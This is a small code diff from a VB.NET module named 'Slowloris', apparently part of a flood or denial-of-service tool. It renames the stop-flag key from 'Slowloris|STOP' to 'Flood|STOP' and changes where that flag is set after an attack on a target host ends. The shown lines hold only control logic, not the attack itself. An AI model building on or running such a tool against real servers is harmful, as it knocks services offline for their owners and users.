@@ -52,14 +52,14 @@ Module Slowloris
             AttackRunning = False
             STV("Flood", "Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
+            STV("Flood|STOP", "True")
         End If
 
-        STV("Slowloris|STOP", "True")
     End Sub
 
     Private Sub StopSlowloris()
 1:
-        If GTV("Slowloris|STOP") = "False" Then
+        If GTV("Flood|STOP") = "False" Then
             Thread.Sleep(1000)
             GoTo 1
         End If
